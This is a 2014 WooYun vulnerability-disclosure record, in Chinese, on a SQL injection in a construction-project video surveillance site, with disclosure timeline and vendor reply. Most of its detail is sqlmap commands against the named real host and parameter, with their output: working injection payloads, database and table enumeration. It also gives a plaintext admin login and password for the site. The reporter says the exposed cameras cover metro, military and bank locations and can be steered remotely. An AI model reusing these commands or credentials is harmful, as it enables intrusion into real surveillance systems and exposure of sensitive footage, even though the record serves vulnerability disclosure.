{"id": 50081, "wybug_id": "wooyun-2014-078958", "wybug_title": "某建设工程视频监控存在sql注入，大量敏感监控视频泄漏", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "kttzd", "wybug_date": "2014-10-11 14:01", "wybug_open_date": "2014-11-25 14:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-25：\t细节向公众公开  简要描述： 那么问题来了？挖掘机哪家强 详细说明：  中国电信建设工程远程监控http://www.fzjsqqy.cn/注入点：    http://www.fzjsqqy.cn/vreg.aspx?parent_id=1  注入:     sqlmap -u http://www.fzjsqqy.cn/vreg.aspx?parent_id=1 --tamper \"space2comment.py\"\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: parent_id    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: parent_id=1' AND 4339=CONVERT(INT,(SELECT CHAR(113)+CHAR(108)+CHAR(122)+CHAR(102)+CHAR(113)+(SELECT (CASE WHEN (4339=4339) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(121)+CHAR(110)+CHAR(115)+CHAR(113))) AND 'eySD'='eySD    Type: UNION query    Title: Generic UNION query (NULL) - 2 columns    Payload: parent_id=1' UNION ALL SELECT NULL,CHAR(113)+CHAR(108)+CHAR(122)+CHAR(102)+CHAR(113)+CHAR(106)+CHAR(68)+CHAR(65)+CHAR(68)+CHAR(114)+CHAR(109)+CHAR(70)+CHAR(69)+CHAR(78)+CHAR(97)+CHAR(113)+CHAR(121)+CHAR(110)+CHAR(115)+CHAR(113)--     Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: parent_id=1'; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: parent_id=1' WAITFOR DELAY '0:0:5'-----\nsqlmap -u http://www.fzjsqqy.cn/vreg.aspx?parent_id=1 --tamper \"space2comment.py\"  --dbs\navailable databases [27]:[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] sq_ceshi201211[*] sq_chinampsorg[*] sq_ecallcencom[*] sq_fjipp[*] sq_fjsctcom[*] sq_fuanteacn1[*] sq_fuanteacn2[*] sq_fuanteacn3[*] sq_fzforza[*] sq_fzforzacn1[*] sq_fzforzacn2[*] sq_fzjsqqycom[*] sq_fzzcitcom[*] sq_houseproperty2[*] sq_ht36543com[*] sq_huaminxinke[*] sq_jsjcdb[*] sq_jsqqycom[*] sq_kmgood[*] sq_landiao[*] sq_zhlinshicom[*] tempdb\n sqlmap -u http://www.fzjsqqy.cn/vreg.aspx?parent_id=1 --tamper \"space2comment.py\"  --current-db\ncurrent database:    'sq_fzjsqqycom'\n这是个忧伤的故事...sqlmap -u http://www.fzjsqqy.cn/vreg.aspx?parent_id=1 --tamper \"space2comment.py\"  -D sq_fzjsqqycom --tables\nDatabase: sq_fzjsqqycom[10 tables]+----------------+| DicInfo        || NewsInfo       || TB_PowerItems  || ad_AdminInfo   || ad_Power       || ad_PowerByRole || ad_PowerByUser || ad_Role        || ad_SysUserInfo || ad_item        |+----------------+\n sqlmap -u http://www.fzjsqqy.cn/vreg.aspx?parent_id=1 --tamper \"space2comment.py\"  -D sq_fzjsqqycom -T ad_AdminInfo --count\nDatabase: sq_fzjsqqycom+------------------+---------+| Table            | Entries |+------------------+---------+| dbo.ad_AdminInfo | 174     |+------------------+---------+\n虽然就174个用户。但是这监控有很多敏感的地方..用admin登录，密码 152410http://www.fzjsqqy.cn/vlogin.aspx     //ie和win环境需要需要下载下插件   漏洞证明：  \n\n如果提示监控未注册就是监控被撤销了\n\n有的视频比较敏感，有什么地铁监控办公室的视频监控，部队的...银行的。并且监控器可控制，可以调焦拉伸还能四处移动...不搞了。。   修复方案：  你们更懂   版权声明：转载请注明来源 kttzd@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2014-10-15 17:54 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 9, "Ranks": null}